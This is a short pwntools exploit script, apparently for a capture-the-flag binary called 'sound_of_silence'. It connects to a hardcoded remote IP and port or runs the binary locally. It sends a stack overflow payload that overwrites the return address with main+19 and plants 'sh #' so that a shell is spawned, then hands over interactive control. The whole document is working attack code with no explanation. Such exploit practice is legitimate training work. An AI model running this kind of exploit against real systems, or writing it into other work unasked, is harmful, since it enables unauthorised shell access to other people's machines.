from pwn import *

gs = '''
break *main+22
continue
'''

elf = context.binary = ELF("./sound_of_silence")

def start():
    if args.REMOTE:
        return remote("83.136.255.149", 39786)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

offset = 40

payload = b"".join([
    b"A"*32,
    b"sh #".ljust(8, b"\x00"),
    p64(elf.sym.main + 19) 
])

io.sendlineafter(">> ", payload)

io.sendline(payload)

io.interactive()
